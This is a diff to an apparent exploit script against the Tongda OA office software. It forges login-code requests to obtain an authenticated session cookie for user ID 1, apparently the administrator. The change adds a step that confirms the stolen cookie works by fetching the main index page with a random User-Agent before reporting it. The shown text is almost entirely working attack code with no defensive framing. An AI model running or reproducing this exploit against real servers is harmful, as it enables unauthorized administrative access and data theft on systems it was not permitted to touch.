@@ -1,8 +1,8 @@
 '''
 @Author         : Sp4ce
 @Date           : 2020-03-17 23:42:16
-@LastEditors    : Sp4ce
-@LastEditTime   : 2020-04-22 16:24:52
+LastEditors    : Sp4ce
+LastEditTime   : 2020-08-27 10:21:44
 @Description    : Challenge Everything.
 '''
 import requests
@@ -59,7 +59,15 @@ def getV11Session(url):
         getSessUrl = url+'/logincheck_code.php'
         res = requests.post(
             getSessUrl, data={'CODEUID': '{'+codeUid+'}', 'UID': int(1)},headers=headers)
-        print('[+]Get Available COOKIE:'+res.headers['Set-Cookie'])
+        tmp_cookie = res.headers['Set-Cookie']
+        headers["User-Agent"] = choice(USER_AGENTS)
+        headers["Cookie"] = tmp_cookie
+        check_available = requests.get(url + '/general/index.php',headers=headers)
+        if '用户未登录' not in check_available.text:
+            if '重新登录' not in check_available.text:
+                print('[+]Get Available COOKIE:' + res.headers['Set-Cookie'])
+        else:
+            print('[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.')
     except:
         print('[-]Something Wrong With '+url)
 
@@ -80,7 +88,15 @@ def get2017Session(url):
         if status == str(1):
             getCodeUidUrl = url+'/ispirit/login_code_check.php?codeuid='+codeUid
             res = requests.get(getCodeUidUrl)
-            print('[+]Get Available COOKIE:'+res.headers['Set-Cookie'])
+            tmp_cookie = res.headers['Set-Cookie']
+            headers["User-Agent"] = choice(USER_AGENTS)
+            headers["Cookie"] = tmp_cookie
+            check_available = requests.get(url + '/general/index.php',headers=headers)
+            if '用户未登录' not in check_available.text:
+                if '重新登录' not in check_available.text:
+                    print('[+]Get Available COOKIE:' + res.headers['Set-Cookie'])
+            else:
+                print('[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.')
         else:
             print('[-]Something Wrong With '+url  + ' Maybe Not Vulnerable ?')
     except:
